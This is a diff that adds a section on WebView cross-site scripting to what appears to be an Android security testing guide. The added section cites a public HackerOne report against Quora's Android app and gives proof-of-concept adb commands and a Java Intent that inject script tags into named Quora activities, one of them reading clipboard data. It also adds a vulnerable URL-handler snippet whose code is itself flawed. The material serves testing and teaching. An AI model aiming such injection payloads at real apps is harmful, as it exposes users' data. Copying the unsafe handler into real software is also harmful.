@@ -172,6 +172,36 @@ XSS issues may exist if the URL opened by WebView is partially determined by use
 ```java
 webView.loadUrl("javascript:initialize(" + myNumber + ");");
 ```
+Another example of XSS issues determined by user input is public overriden methods. 
+
+```java
+@Override
+public boolean shouldOverrideUrlLoading(WebView view, String url) {
+  if (url.substring(0,6).equalsIgnoreCase("yourscheme:")) {
+    // parse the URL object and execute functions
+  }
+}
+```
+
+Sergey Bobrov was able to take advantage of this in the following [HackerOne report](https://hackerone.com/reports/189793). Any input to the html parameter would be trusted in Quora's ActionBarContentActivity. Payloads were successful using adb, clipboarddata via ModalContentActivity, and Intents from 3rd party applications.
+
+- ADB
+```bash
+adb shell
+am start -n com.quora.android/com.quora.android.ActionBarContentActivity -e url 'http://test/test' -e html 'XSS<script>alert(123)</script>'
+```
+- Clipboard Data
+```bash
+am start -n com.quora.android/com.quora.android.ModalContentActivity -e url 'http://test/test' -e html '<script>alert(QuoraAndroid.getClipboardData());</script>'
+```
+- 3rd party Intent
+```java
+Intent i = new Intent();
+i.setComponent(new ComponentName("com.quora.android","com.quora.android.ActionBarContentActivity"));
+i.putExtra("url","http://test/test");
+i.putExtra("html","XSS PoC <script>alert(123)</script>");
+startActivity(i);
+```
 
 If WebView is used to display a remote website, the burden of escaping HTML shifts to the server side. If an XSS flaw exists on the web server, this can be used to execute script in the context of the WebView. As such, it is important to perform static analysis of the web application source code.
 
@@ -214,4 +244,8 @@ A [reflected XSS attack](https://www.owasp.org/index.php/Testing_for_Reflected_C
 #### CWE
 
 - CWE-20 - Improper Input Validation
+
+#### XSS via start ContentActivity
+
+- https://hackerone.com/reports/189793
 
